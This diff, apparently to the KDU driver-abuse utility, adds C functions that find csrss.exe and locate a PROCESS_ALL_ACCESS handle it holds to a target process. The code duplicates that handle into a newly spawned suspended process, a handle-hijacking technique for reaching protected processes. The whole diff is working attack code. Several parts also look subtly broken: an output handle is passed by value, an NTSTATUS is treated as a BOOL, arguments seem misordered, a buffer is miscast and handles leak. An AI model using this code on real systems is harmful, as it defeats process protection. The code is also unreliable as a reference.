@@ -19,6 +19,7 @@
 
 #include "global.h"
 #include <Dbghelp.h>
+#include <TlHelp32.h>
 
 typedef BOOL(WINAPI* pfnMiniDumpWriteDump)(
     _In_ HANDLE hProcess,
@@ -683,4 +684,256 @@ BOOL KDUControlProcessMitigationFlags(
     FUNCTION_LEAVE_MSG(__FUNCTION__);
 
     return bResult1 && bResult2;
+}
+
+/*
+* KDURunCommandDup
+*
+* Purpose:
+*
+* Start a Process to duplicate a handle into
+*
+*/
+BOOL KDURunCommandDup(
+    _In_ PKDU_CONTEXT Context,
+    _In_ LPWSTR CommandLine,
+    _In_ ULONG_PTR TargetProcessId,
+    _Out_ HANDLE dupHandle)
+{
+    BOOL       bResult = FALSE;
+    DWORD      dwThreadResumeCount = 0;
+    dupHandle = { 0 };
+
+    // find csrss.exe with tlhelp and store as SourceProcessId
+    ULONG_PTR SourceProcessId = 0;
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) {
+        supShowWin32Error("[!] Failed to create process snapshot", GetLastError());
+        return FALSE;
+    }
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(PROCESSENTRY32);
+    if (Process32First(hSnapshot, &pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, L"csrss.exe") == 0) {
+                SourceProcessId = pe.th32ProcessID;
+                break;
+            }
+        } while (Process32Next(hSnapshot, &pe));
+    }
+    CloseHandle(hSnapshot);
+    if (SourceProcessId == 0) {
+        printf_s("[!] Failed to find csrss.exe process\n");
+        return FALSE;
+    }
+
+    STARTUPINFO si;
+    PROCESS_INFORMATION pi;
+
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    wprintf_s(L"[+] Creating Process '%s'\r\n", CommandLine);
+
+    bResult = CreateProcess(
+        NULL,               // No module name (use command line)
+        CommandLine,        // Command line
+        NULL,               // Process handle not inheritable
+        NULL,               // Thread handle not inheritable
+        FALSE,              // Set handle inheritance to FALSE
+        CREATE_SUSPENDED,   // Create Process suspended so we can edit
+        // its protection level prior to starting
+        NULL,               // Use parent's environment block
+        NULL,               // Use parent's starting directory 
+        &si,                // Pointer to STARTUPINFO structure
+        &pi);               // Pointer to PROCESS_INFORMATION structure
+    if (!bResult) {
+        supShowWin32Error("[!] Failed to create process", GetLastError());
+        return bResult;
+    }
+    printf_s("[+] Created Process with PID %lu\r\n", pi.dwProcessId);
+
+    bResult = KDUDuplicateProcessHandle(Context, pi.hProcess, SourceProcessId, TargetProcessId, &dupHandle);
+    if (!bResult) {
+        supShowWin32Error("[!] Failed to duplicate handle", GetLastError());
+        return bResult;
+    }
+
+    dwThreadResumeCount = ResumeThread(pi.hThread);
+    if (dwThreadResumeCount != 1) {
+        printf_s("[!] Failed to resume process: %lu | 0x%lX\n", dwThreadResumeCount, GetLastError());
+        return bResult;
+    }
+
+    // Wait until child process exits.
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    // Close process and thread handles.
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return bResult;
+}
+
+// Helper function to find a handle with PROCESS_ALL_ACCESS rights to TargetPid in SourcePid process and return it for duplication
+HANDLE FindProcessHandle(ULONG_PTR sourcePid, HANDLE hTargetProcess, ULONG_PTR targetPid) {
+    printf_s("[*] Searching for a handle with PROCESS_ALL_ACCESS to target process %llu in source process %llu\r\n", targetPid, sourcePid);
+
+    ULONG bufferSize = 0x4000; // Start with a 16KB buffer
+    PVOID buffer = ntsupVirtualAlloc((SIZE_T)bufferSize);
+    if (!buffer) return NULL;
+
+    NTSTATUS ntStatus = NtQuerySystemInformation(
+        (SYSTEM_INFORMATION_CLASS)SystemHandleInformation,
+        buffer,
+        bufferSize,
+        &bufferSize
+    );
+
+    // Reallocate if the process contains more handles than expected
+    if (ntStatus == STATUS_INFO_LENGTH_MISMATCH) {
+        ntsupVirtualFree(buffer);
+
+        buffer = ntsupVirtualAlloc((SIZE_T)bufferSize);
+        if (!buffer) {
+            printf_s("[!] Failed to allocate buffer for handle information\r\n");
+            return NULL;
+        }
+
+        ntStatus = NtQuerySystemInformation(
+            (SYSTEM_INFORMATION_CLASS)SystemHandleInformation,
+            buffer,
+            bufferSize,
+            &bufferSize
+        );
+    }
+
+    if (!NT_SUCCESS(ntStatus)) {
+        if (buffer) ntsupVirtualFree(buffer);
+        printf_s("[!] Failed to query process handle information from source process\r\n");
+        return NULL;
+    }
+
+    printf_s("[*] Source process has %llu handles\r\n", ((PPROCESS_HANDLE_SNAPSHOT_INFORMATION)buffer)->NumberOfHandles);
+
+    HANDLE hFoundHandle = NULL;
+    PSYSTEM_HANDLE_INFORMATION handleInfo = (PSYSTEM_HANDLE_INFORMATION)buffer;
+    PVOID targetEprocessAddress = NULL;
+    ULONG_PTR currentPid = GetCurrentProcessId();
+
+    // Resolve Target Process' kernel EPROCESS address by looking up kdu.exe's open handle
+    for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
+        SYSTEM_HANDLE_TABLE_ENTRY_INFO entry = handleInfo->Handles[i];
+
+        if (entry.UniqueProcessId == currentPid) {
+
+            // Match the handle value that KDUOpenProcess gave us for the target
+            if ((HANDLE)(ULONG_PTR)entry.HandleValue == hTargetProcess) {
+                targetEprocessAddress = entry.Object;
+                break;
+            }
+        }
+    }
+    if (targetEprocessAddress == NULL) {
+        printf_s("[!] Failed to resolve target process EPROCESS kernel pointer\r\n");
+        ntsupVirtualFree(buffer);
+        return NULL;
+    }
+
+    printf_s("[*] Resolved target process EPROCESS kernel pointer: 0x%p\n", targetEprocessAddress);
+
+    // Find the handle inside Source Process (csrss.exe) pointing to that kernel address
+    for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
+        SYSTEM_HANDLE_TABLE_ENTRY_INFO entry = handleInfo->Handles[i];
+
+        if (entry.UniqueProcessId == sourcePid) { // must be owned by the source process (csrss.exe)
+
+            if (entry.Object == targetEprocessAddress) { // must point to the target process EPROCESS in kernel
+
+                if ((entry.GrantedAccess & PROCESS_ALL_ACCESS) == PROCESS_ALL_ACCESS) {
+
+                    hFoundHandle = (HANDLE)(ULONG_PTR)entry.HandleValue;
+                    printf_s("[+] Found valid handle value! Handle: 0x%p (Access: 0x%lX)\n",
+                        hFoundHandle, entry.GrantedAccess);
+                    break;
+                }
+            }
+        }
+    }
+
+    ntsupVirtualFree(buffer);
+    return hFoundHandle;
+}
+
+/*
+* KDUDuplicateProcessHandle
+*
+* Purpose:
+*
+* Duplicates a process handle with PROCESS_ALL_ACCESS rights to our new process.
+*
+*/
+BOOL KDUDuplicateProcessHandle(
+    _In_ PKDU_CONTEXT Context,
+    _In_ HANDLE hNewProcess,
+    _In_ ULONG_PTR SourceProcessId,
+    _In_ ULONG_PTR TargetProcessId,
+    _Out_ PHANDLE DupHandle
+)
+{
+    BOOL bResult = FALSE;
+    HANDLE hSourceProcess = NULL, hTargetProcess = NULL;
+
+    FUNCTION_ENTER_MSG(__FUNCTION__);
+
+    bResult = KDUOpenProcess(Context, (HANDLE)SourceProcessId, PROCESS_DUP_HANDLE, &hSourceProcess);
+    if (bResult && hSourceProcess != NULL) {
+        printf_s("[+] Process with PID %llu opened (PROCESS_DUP_HANDLE)\r\n", SourceProcessId);
+
+        bResult = KDUOpenProcess(Context, (HANDLE)TargetProcessId, PROCESS_DUP_HANDLE, &hTargetProcess);
+        if (bResult && hTargetProcess != NULL) {
+            printf_s("[+] Process with PID %llu opened (PROCESS_DUP_HANDLE)\r\n", TargetProcessId);
+
+            // search for the handle in sourceProcess with PROCESS_ALL_ACCESS on targetProcess, to duplicate into the newProcess
+            HANDLE hSourceProcessHandleToDup = FindProcessHandle(SourceProcessId, hTargetProcess, TargetProcessId);
+            if (hSourceProcessHandleToDup != NULL) {
+
+                bResult = NtDuplicateObject(hSourceProcess,
+                    hSourceProcessHandleToDup,
+                    hNewProcess,
+                    DupHandle,
+                    PROCESS_ALL_ACCESS,
+                    TRUE,      // OBJ_INHERIT (for the new process to use)
+                    DUPLICATE_SAME_ACCESS
+                );
+                if (bResult) {
+                    printf_s("[+] Duplicated process handle to new process\r\n");
+                }
+                else {
+                    supShowHardError("[!] Failed to duplicate process handle", bResult);
+                    bResult = FALSE;
+                }
+                NtClose(hTargetProcess);
+            }
+            else {
+                printf_s("[!] Failed to find a handle with PROCESS_ALL_ACCESS to target process %llu in source process %llu\n", TargetProcessId, SourceProcessId);
+                bResult = FALSE;
+            }
+        }
+        else {
+            supShowHardError("[!] Cannot open target process", bResult);
+        }
+        NtClose(hSourceProcess);
+    }
+    else {
+        supShowHardError("[!] Cannot open source process", bResult);
+    }
+    FUNCTION_LEAVE_MSG(__FUNCTION__);
+
+    if (!bResult) {
+        printf_s("[!] Handle duplication failed. Check if the source process has a handle with PROCESS_ALL_ACCESS to the target process.\n");
+        *DupHandle = NULL;
+    }
+    return bResult;
 }
